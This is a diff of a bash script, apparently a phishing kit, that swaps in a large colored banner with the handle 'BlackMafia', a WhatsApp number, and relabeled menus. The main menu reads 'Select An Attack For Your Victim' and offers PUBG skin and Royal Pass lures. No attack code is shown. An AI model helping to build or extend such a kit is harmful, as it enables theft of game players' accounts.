@@ -69,10 +69,40 @@ ${ORANGE} ------ Your Mind is Your Best Weapon-------●
 ## Small Banner
 banner_mafia() {
 	cat <<- EOF
-${BLUE}
-${ORANGE}___  _  _ _ ____ _  _ _ _  _ ____ 
-${ORANGE}|__] |__| | [__  |__| | |\ | | __ 
-${ORANGE}|    |  | | ___] |  | | | \| |__] 
+${ORANGE}
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾵﾬﾴﾳﾳﾦﾭﾤ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤﾵ${ORANGE}ￚￚￚￚￚￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤﾳﾹﾡ${ORANGE}ￚￚￚￚￚￚￚ${GREEN}ﾡￛￅﾬﾤￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￃﾳￋￋￋￋￋￋￋￚￜ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡￛￗﾤￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛￋￋￋￋￋￋￋￋￋￋￋￋￋￜ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤￅﾤￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛﾤￋￋￋￃￋￋￃￋￋￋￋￋￋￂ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡￜￋￚￚￚￚￚￚￚￚￚ${GREEN}ￏￅￋￃￋￃￋￋￋￋￋￋￋￃￋￋ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡﾡﾴￚￚￚￚￚￚ${GREEN}ￎￋￋￋￋￋￋￃￃￃￋￋￋￋￋￋￅ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛￋￚￚￚￚ${GREEN}ￅￋￋￋￋￋￋￋￋￋￋￋￋￋￃￋￋￋ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤￔﾤￚￚ${GREEN}ￛￋￋￋￃￋￋￖￋￋￃￃￋￋￋￃￋￋ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡﾡﾬￚￚ${GREEN}ￕￋￖￎￋￋￃￃￃￋﾨￃￃￃￋￃￃ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￋￋￚﾤￔￋￃￋￃￖￖￖￂￃￃￃﾳￋﾨ${ORANGE}ￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤￕￚﾡﾨﾡￃￋￋￋￃￃￖﾳￚￄ${ORANGE}ￚￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤￕￚￚￚￚￜￋￃￖￃￃﾦﾵﾤ${ORANGE}ￚￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￕￕﾤￚￋￋﾡￖￃￋﾳￃￖￃￖﾤ${ORANGE}ￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾵￃￋﾪￚￚￚￚￚￚￖￋￃￃￂﾤ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￅￋﾤￌﾵﾺﾤￜﾤￂﾽﾡￃￃￖ${ORANGE}ￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛￋￃￋﾳￕￋￚￌￚￚￂￃﾶￎￃￂￃﾤ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛￃￅￋￋￋﾴￋￃￋﾳﾳￋￃￃﾳﾳￓﾡ${ORANGE}ￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡﾡￚￚￚﾡￕￚﾡￋￋﾨￚￚￚￂￏ${ORANGE}ￚￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￋￕ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛￃￋￋￋￋﾳￋￋￃￃￋ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡﾨￋￏￅ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￍￃￃￃￃￋￃￃￃￃￋￋ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚ${GREEN}ￃￂￂￏￋﾮ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￃￃￃￃￋￋￃￃￃￃￋￋ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾨￏￏￏￖￋￋﾤ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￃￃￃￃￋￋￃￃￃￃￋﾤ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚ${GREEN}ￎﾡￂￂￂￏￖ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￃￃￃￃￋﾤￃￃￃￃￃ${ORANGE}ￚￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚ${GREEN}ￛￖￖﾥￂￂￂￃￏ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￃￃￋￋￚﾡￃￃￃￃﾨ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚ${GREEN}ￕￃￄￂￂￂￖￋ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￕￋￋￋﾴￚﾻￋￖￋￋ${ORANGE}ￚￚￚ
+${ORANGE} ￚ${GREEN}ￕￋￃￂￂￂﾤￛￋￖￏￏﾴￖￅ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￋￃￃￋￚￚￅￃￃￖ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚ${GREEN}ￜￚￜﾡﾡￓﾡￋￚￚﾡﾴ${ORANGE}ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￛￃￃﾮￚￚￚￂￃￃ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ￒￋￋﾴ${ORANGE}ￚￚￚ${GREEN}ￃￃￋ${ORANGE}ￚￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾤﾳￋￂￂￃﾴ${ORANGE}ￚ${GREEN}ﾲￋￂￃￃﾤ${ORANGE}ￚￚ
+${ORANGE} ￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚￚ${GREEN}ﾡﾡﾡ${ORANGE}ￚￚￚ${GREEN}ﾴﾹﾶￚﾡﾡￚ${ORANGE}ￚￚ    
+${ORANGE} ___  _  _ _ ____ _  _ _ _  _ ____  ${MAGENTA} BlackMafia
+${ORANGE} |__] |__| | [__  |__| | |\ | | __  ${MAGENTA} WhatsApp
+${ORANGE} |    |  | | ___] |  | | | \| |__]  ${MAGENTA} 03094161457
 	EOF
 }
 
@@ -297,7 +327,7 @@ lovehacker_facebook() {
 
 ${RED}[${WHITE}01${RED}]${ORANGE} link Editor M416		
 ${RED}[${WHITE}02${RED}]${ORANGE} link Editor RoyalPass 17		
-${RED}[${WHITE}03${RED}]${ORANGE} Testing		
+${RED}[${WHITE}03${RED}]${ORANGE} link Editor M416 Glacier	
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -327,7 +357,7 @@ main_menu() {
 ${MAGENTA} Select An Attack For Your Victim
 ${RED}[${WHITE}01${RED}] Pubg Gun Skin M416
 ${RED}[${WHITE}02${RED}] Pubg Royal Pass 17
-${RED}[${WHITE}03${RED}] BlackMafia Testing New Project
+${RED}[${WHITE}03${RED}] Pubg M416 Glacier
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
